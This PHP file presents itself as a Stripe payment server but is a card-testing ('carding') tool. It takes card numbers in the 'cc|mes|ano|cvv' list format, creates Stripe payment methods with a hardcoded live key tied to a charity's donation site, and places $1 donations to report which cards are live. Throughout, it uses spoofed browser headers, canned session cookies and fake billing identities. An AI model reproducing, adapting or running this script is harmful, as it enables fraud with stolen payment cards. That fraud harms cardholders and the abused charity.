<?php
// app.php - Stripe Payment Processor Server
// Configure for Render hosting

// Enable CORS for frontend requests
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/logs/error.log');

// Set content type to JSON
header('Content-Type: application/json');

// Simple API key validation (you can modify this as needed)
function validateApiKey() {
    $validKeys = ['your_api_key_here', 'test_key_123']; // Replace with your actual API keys
    $providedKey = $_GET['api_key'] ?? $_SERVER['HTTP_X_API_KEY'] ?? '';
    
    if (empty($providedKey) || !in_array($providedKey, $validKeys)) {
        error_log("Invalid API key provided: " . $providedKey);
        http_response_code(401);
        echo json_encode(['status' => 'ERROR', 'message' => 'Invalid API key']);
        exit;
    }
    return true;
}

// Validate session for non-admin users (simplified for API)
function validateSession() {
    if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
        if (!isset($_SESSION['user']) || ($_SESSION['user']['auth_provider'] ?? '') !== 'telegram') {
            // For API usage, we'll allow with valid API key instead of session
            validateApiKey();
        }
    }
    return true;
}

// Main API endpoint handler
function handleCCRequest($ccData) {
    // Parse the CC data from lista format: {cc|mes|ano|cvv}
    $parts = explode('|', $ccData);
    
    if (count($parts) < 4) {
        return [
            'status' => 'ERROR',
            'message' => 'Invalid CC format. Use: cc|mes|ano|cvv'
        ];
    }
    
    $cardNumber = str_replace([' ', '-', '_'], '', $parts[0]);
    $expMonth = $parts[1];
    $expYear = $parts[2];
    $cvc = $parts[3];
    
    // Validate card details
    if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
        return [
            'status' => 'DECLINED', 
            'message' => 'Missing card details'
        ];
    }
    
    // Basic card number validation
    if (!preg_match('/^\d{13,19}$/', $cardNumber)) {
        return [
            'status' => 'DECLINED',
            'message' => 'Invalid card number'
        ];
    }
    
    // Format year to 4 digits if needed
    if (strlen($expYear) == 2) {
        $expYear = '20' . $expYear;
    }
    
    // Process the payment using the existing logic
    return processStripePayment($cardNumber, $expMonth, $expYear, $cvc);
}

// Function to fetch a new cart token
function fetchCartToken($cookieJar) {
    $cartHeaders = [
        'authority: www.onamissionkc.org',
        'accept: application/json',
        'accept-encoding: gzip, deflate, br, zstd',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/json',
        'origin: https://www.onamissionkc.org',
        'referer: https://www.onamissionkc.org/donate-now',
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-model: "Nexus 5"',
        'sec-ch-ua-platform: "Android"',
        'sec-ch-ua-platform-version: "6.0"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    ];

    $cartData = json_encode([
        'amount' => [
            'value' => 100,
            'currencyCode' => 'USD',
        ],
        'donationFrequency' => 'ONE_TIME',
        'feeAmount' => null,
    ]);

    $ch = curl_init('https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $cartHeaders);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $cartData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $cartResponse = curl_exec($ch);
    $cartResult = json_decode($cartResponse, true);
    $cartHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($cartHttpCode != 200 || !isset($cartResult['redirectUrlPath'])) {
        $errorMsg = $cartResult['error']['message'] ?? 'Failed to create new cart';
        error_log("Failed to fetch new cart token: $errorMsg");
        return null;
    }

    preg_match('/cartToken=([^&]+)/', $cartResult['redirectUrlPath'], $matches);
    if (!isset($matches[1])) {
        error_log("Failed to extract cart token from redirectUrlPath");
        return null;
    }

    return $matches[1];
}

// Function to make merchant API call
function makeMerchantApiCall($cartToken, $pid, $cookieJar) {
    $cookies = 'crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ' .
               'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' .
               'ss_cvt=1760724937850; ' .
               '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' .
               '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67';

    $headers = [
        'authority: www.onamissionkc.org',
        'accept: application/json, text/plain, */*',
        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
        'content-type: application/json',
        'origin: https://www.onamissionkc.org',
        'referer: https://www.onamissionkc.org/checkout?cartToken=' . $cartToken,
        'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-csrf-token: BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MGE1',
    ];

    $jsonData = json_encode([
        'email' => 'grogeh@gmail.com',
        'subscribeToList' => false,
        'shippingAddress' => [
            'id' => '',
            'firstName' => '',
            'lastName' => '',
            'line1' => '',
            'line2' => '',
            'city' => '',
            'region' => 'NY',
            'postalCode' => '',
            'country' => '',
            'phoneNumber' => '',
        ],
        'createNewUser' => false,
        'newUserPassword' => null,
        'saveShippingAddress' => false,
        'makeDefaultShippingAddress' => false,
        'customFormData' => null,
        'shippingAddressId' => null,
        'proposedAmountDue' => [
            'decimalValue' => '1',
            'currencyCode' => 'USD',
        ],
        'cartToken' => $cartToken,
        'paymentToken' => [
            'stripePaymentTokenType' => 'PAYMENT_METHOD_ID',
            'token' => $pid,
            'type' => 'STRIPE',
        ],
        'billToShippingAddress' => false,
        'billingAddress' => [
            'id' => '',
            'firstName' => 'Davide',
            'lastName' => 'Washintonne',
            'line1' => 'Siles Avenue',
            'line2' => '',
            'city' => 'Oakford',
            'region' => 'PA',
            'postalCode' => '19053',
            'country' => 'US',
            'phoneNumber' => '+1361643646',
        ],
        'savePaymentInfo' => false,
        'makeDefaultPayment' => false,
        'paymentCardId' => null,
        'universalPaymentElementEnabled' => true,
    ]);

    $ch = curl_init('https://www.onamissionkc.org/api/2/commerce/orders');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $result = json_decode($response, true);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ['response' => $result, 'httpCode' => $httpCode];
}

// Main payment processing function
function processStripePayment($cardNumber, $expMonth, $expYear, $cvc) {
    // Initialize cookie jar for session continuity
    $cookieJar = tempnam(sys_get_temp_dir(), 'cookies');

    // First API call to create payment method
    $headers = [
        'authority: api.stripe.com',
        'accept: application/json',
        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://js.stripe.com',
        'referer: https://js.stripe.com/',
        'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    ];

    $data = 'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]=' . $cardNumber . '&card[cvc]=' . $cvc . '&card[exp_year]=' . $expYear . '&card[exp_month]=' . $expMonth . '&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep';

    $ch = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $apx = json_decode($response, true);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode != 200 || !isset($apx['id'])) {
        $errorMsg = $apx['error']['message'] ?? 'Unknown error';
        unlink($cookieJar);
        return [
            'status' => 'DECLINED', 
            'message' => $errorMsg
        ];
    }

    $pid = $apx["id"];

    // Attempt merchant API call with retry on errors
    $maxRetries = 3;
    $retryCount = 0;
    $cartToken = fetchCartToken($cookieJar);
    
    if (!$cartToken) {
        unlink($cookieJar);
        return [
            'status' => 'ERROR',
            'message' => 'Unable to create cart'
        ];
    }

    while ($retryCount < $maxRetries) {
        $merchantResult = makeMerchantApiCall($cartToken, $pid, $cookieJar);
        $apx1 = $merchantResult['response'];
        $httpCode = $merchantResult['httpCode'];

        if ($httpCode == 200 && !isset($apx1['failureType'])) {
            // Success
            unlink($cookieJar);
            return [
                'status' => 'CHARGED',
                'message' => 'Charged $1 successfully',
                'response' => 'CHARGED'
            ];
        }

        // Handle specific errors
        if (isset($apx1['failureType']) && in_array($apx1['failureType'], ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION'])) {
            error_log("Error: {$apx1['failureType']}, retrying with new cart token");
            $cartToken = fetchCartToken($cookieJar);
            if (!$cartToken) {
                break;
            }
            $retryCount++;
            continue;
        }

        // Other failures
        $errorMsg = $apx1['failureType'] ?? 'Unknown error';
        unlink($cookieJar);
        return [
            'status' => 'DECLINED',
            'message' => 'Your card was declined',
            'response' => $errorMsg
        ];
    }

    // Max retries reached
    unlink($cookieJar);
    return [
        'status' => 'ERROR',
        'message' => 'Unable to process payment due to persistent errors',
        'response' => 'MAX_RETRIES_EXCEEDED'
    ];
}

// Main request handler
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Handle lista parameter
    if (isset($_GET['lista'])) {
        $ccData = $_GET['lista'];
        $result = handleCCRequest($ccData);
        echo json_encode($result);
    } else {
        // Show usage information
        echo json_encode([
            'status' => 'INFO',
            'message' => 'Stripe Payment Processor API',
            'usage' => 'GET ?lista=cc|mes|ano|cvv',
            'example' => '?lista=4111111111111111|12|2025|123'
        ]);
    }
} else {
    http_response_code(405);
    echo json_encode([
        'status' => 'ERROR', 
        'message' => 'Method not allowed'
    ]);
}
?>